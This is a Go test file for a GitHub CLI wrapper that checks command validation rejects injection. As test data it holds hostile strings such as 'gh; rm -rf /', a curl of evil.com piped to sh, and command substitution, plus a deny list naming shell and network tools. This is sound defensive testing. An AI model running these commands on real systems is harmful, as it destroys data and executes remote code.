package github

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

func TestValidateCLICommand_SecurityValidation(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		expectError bool
		description string
	}{
		// Valid commands
		{
			name:        "empty command (defaults to gh)",
			command:     "",
			expectError: false,
		},
		{
			name:        "standard gh command",
			command:     "gh",
			expectError: false,
		},
		{
			name:        "hub command",
			command:     "hub",
			expectError: false,
		},
		{
			name:        "absolute path to gh",
			command:     "/usr/bin/gh",
			expectError: false,
		},
		{
			name:        "local bin path to gh",
			command:     "/usr/local/bin/gh",
			expectError: false,
		},

		// Command injection attempts
		{
			name:        "basic injection with semicolon",
			command:     "gh; rm -rf /",
			expectError: true,
			description: "should block command chaining",
		},
		{
			name:        "injection with ampersand",
			command:     "gh & curl evil.com/script.sh | sh",
			expectError: true,
			description: "should block background execution with additional commands",
		},
		{
			name:        "injection with pipe",
			command:     "gh | sh",
			expectError: true,
			description: "should block piping to shell",
		},
		{
			name:        "injection with backticks",
			command:     "gh`rm -rf /`",
			expectError: true,
			description: "should block command substitution",
		},
		{
			name:        "injection with dollar parentheses",
			command:     "gh$(rm -rf /)",
			expectError: true,
			description: "should block command substitution with $(...)",
		},
		{
			name:        "malicious absolute path",
			command:     "/bin/sh",
			expectError: true,
			description: "should block shell executables",
		},
		{
			name:        "relative path injection",
			command:     "../../../bin/sh",
			expectError: true,
			description: "should block relative path traversal",
		},
		{
			name:        "space and special characters",
			command:     "gh --version; echo 'pwned'",
			expectError: true,
			description: "should block commands with spaces and special chars",
		},
		{
			name:        "environment variable injection",
			command:     "${SHELL}",
			expectError: true,
			description: "should block environment variable expansion",
		},
		{
			name:        "tilde expansion with danger",
			command:     "gh~",
			expectError: true,
			description: "should block commands with tilde",
		},

		// Unauthorized but valid-looking commands
		{
			name:        "git command (not in allowlist)",
			command:     "git",
			expectError: true,
			description: "should block non-allowlisted commands",
		},
		{
			name:        "curl command",
			command:     "curl",
			expectError: true,
			description: "should block network tools",
		},
		{
			name:        "unauthorized absolute path",
			command:     "/usr/bin/curl",
			expectError: true,
			description: "should block unauthorized absolute paths",
		},

		// Advanced obfuscation attempts
		{
			name:        "hex encoded characters",
			command:     "g\\x68",
			expectError: true,
			description: "should block hex encoding attempts",
		},
		{
			name:        "unicode characters",
			command:     "gh\u0000",
			expectError: true,
			description: "should block null bytes and unicode tricks",
		},
		{
			name:        "excessive length",
			command:     "gh" + string(make([]byte, 300)),
			expectError: true,
			description: "should block excessively long commands",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCLICommand(tt.command)
			if tt.expectError {
				assert.Error(t, err, "Expected error for command: %s (%s)", tt.command, tt.description)
				if err != nil {
					t.Logf("Correctly blocked: %s - %v", tt.command, err)
				}
			} else {
				assert.NoError(t, err, "Expected no error for valid command: %s", tt.command)
			}
		})
	}
}

func TestNewClient_SecurityIntegration(t *testing.T) {
	tests := []struct {
		name            string
		command         string
		expectedCommand string
		description     string
	}{
		{
			name:            "malicious command falls back to safe default",
			command:         "rm -rf /; gh",
			expectedCommand: "gh",
			description:     "should sanitize malicious commands",
		},
		{
			name:            "valid command preserved",
			command:         "gh",
			expectedCommand: "gh",
		},
		{
			name:            "valid absolute path preserved",
			command:         "/usr/bin/gh",
			expectedCommand: "/usr/bin/gh",
		},
		{
			name:            "empty command gets default",
			command:         "",
			expectedCommand: "gh",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			client := NewClient(tt.command, 30*time.Second)
			assert.Equal(t, tt.expectedCommand, client.cliCommand, tt.description)
		})
	}
}

func TestIsAvailable_SecurityValidation(t *testing.T) {
	// Test that IsAvailable re-validates the CLI command
	client := &Client{
		cliCommand: "malicious; rm -rf /",
		timeout:    30 * time.Second,
	}

	err := client.IsAvailable()
	assert.Error(t, err, "IsAvailable should detect and reject malicious CLI commands")
	assert.Contains(t, err.Error(), "security validation", "Error should mention security validation")
}

func TestAllowedCommands_Coverage(t *testing.T) {
	// Verify our allowlist includes expected commands
	expectedCommands := []string{"gh", "hub", "/usr/bin/gh", "/usr/local/bin/gh", "/usr/bin/hub", "/usr/local/bin/hub"}

	for _, cmd := range expectedCommands {
		assert.True(t, allowedCommands[cmd], "Command %s should be in allowlist", cmd)
	}

	// Verify dangerous commands are NOT in allowlist
	dangerousCommands := []string{"sh", "bash", "curl", "wget", "rm", "dd", "cat", "nc"}

	for _, cmd := range dangerousCommands {
		assert.False(t, allowedCommands[cmd], "Dangerous command %s should NOT be in allowlist", cmd)
	}
}

func TestValidCommandPattern_Effectiveness(t *testing.T) {
	tests := []struct {
		command string
		valid   bool
	}{
		// Valid patterns
		{"gh", true},
		{"hub", true},
		{"/usr/bin/gh", true},
		{"/usr/local/bin/gh", true},
		{"my-tool", true},
		{"tool_name", true},

		// Invalid patterns
		{"gh; rm -rf /", false},
		{"gh && evil", false},
		{"gh | sh", false},
		{"gh`evil`", false},
		{"gh$(evil)", false},
		{"./gh", false},
		{"../gh", false},
		{"gh/evil", false},
		{"gh evil", false},
		{"gh\nrm", false},
		{"gh\trm", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			matches := validCommandPattern.MatchString(tt.command)
			assert.Equal(t, tt.valid, matches, "Pattern match result for: %s", tt.command)
		})
	}
}

func BenchmarkValidateCLICommand(b *testing.B) {
	testCommands := []string{
		"gh",
		"/usr/bin/gh",
		"malicious; rm -rf /",
		"gh$(evil)",
		"hub",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, cmd := range testCommands {
			_ = validateCLICommand(cmd)
		}
	}
}